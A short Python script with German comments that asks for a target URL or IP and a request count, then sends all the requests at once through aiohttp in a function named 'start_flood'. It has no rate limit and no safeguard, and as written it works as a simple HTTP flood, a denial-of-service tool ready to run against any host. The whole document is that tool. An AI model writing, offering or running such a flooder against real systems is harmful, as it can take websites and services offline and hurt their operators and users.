import asyncio
import aiohttp
import time

# Funktion für eine einzelne Anfrage
async def send_request(session, url):
    try:
        async with session.get(url) as response:
            status = response.status
            print(f"Anfrage gesendet - Status: {status}")
    except Exception as e:
        print(f"Fehler: {e}")

# Hauptfunktion für parallele Anfragen
async def start_flood(url, num_requests):
    print(f"Starte {num_requests} Anfragen an {url}...")
    start_time = time.time()

    # Erstelle eine Session für alle Anfragen
    async with aiohttp.ClientSession() as session:
        # Liste von Tasks für alle Anfragen
        tasks = [send_request(session, url) for _ in range(num_requests)]
        # Führe alle Tasks gleichzeitig aus
        await asyncio.gather(*tasks)

    end_time = time.time()
    print(f"Fertig! Dauer: {end_time - start_time:.2f} Sekunden")

# Benutzereingabe und Event-Loop
if __name__ == "__main__":
    target_url = input("Gib die Ziel-URL oder IP ein (z. B. http://example.com): ")
    try:
        requests_total = int(input("Wie viele Anfragen sollen gesendet werden? "))
        if requests_total <= 0:
            raise ValueError("Die Anzahl muss positiv sein!")
    except ValueError as e:
        print(f"Ungültige Eingabe: {e}")
        exit()

    # Starte das asynchrone Programm
    asyncio.run(start_flood(target_url, requests_total))
